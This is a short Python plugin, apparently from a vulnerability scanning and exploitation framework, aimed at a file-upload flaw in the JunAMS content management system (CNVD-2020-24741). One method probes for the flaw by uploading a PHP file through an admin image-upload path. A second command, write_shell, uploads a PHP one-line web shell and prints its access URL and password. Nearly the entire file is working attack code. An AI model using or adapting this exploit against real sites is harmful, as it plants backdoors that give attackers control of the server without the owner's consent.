# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "JunAms内容管理系统文件上传漏洞",
        "description": "JunAMS是一款以ThinkPHP为框架的开源内容管理系统。JunAMS内容管理系统存在文件上传漏洞，攻击者可利用该漏洞上传webshell，获取服务器权限",
        "references": ["https://www.cnvd.org.cn/flaw/show/CNVD-2020-24741"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(10)
        res = self.custom_upload_file(random_str, random_str)
        if res:
            return {"LoopholeInfo": self.__info__}

    def custom_upload_file(self, content, flag):
        files = {"file": ("file.php", (content+"\r\n").encode())}
        r = self.request(method='post', path='./admin.php/common/add_images.html', timeout=15, files=files)
        if r.status_code != 200:
            return
        resp = r.json()
        if resp['code'] != 0:
            return
        path = resp['data']['src']
        r = self.request(method='get', path='./'+path, timeout=15)
        if r.status_code == 200 and flag in r.text:
            return path

    @cli.command(description='写入一句话马')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def write_shell(self, url):
        name, password, code, flag = self.build_web_shell('php')
        res = self.custom_upload_file(code, flag)
        if res:
            self.log.success('一句话马写入成功')
            self.log.success(f'访问地址: {urllib.parse.urljoin(url, res)}')
            self.log.success(f'访问密码: {password}')
        else:
            self.log.failure('一句话马写入失败')
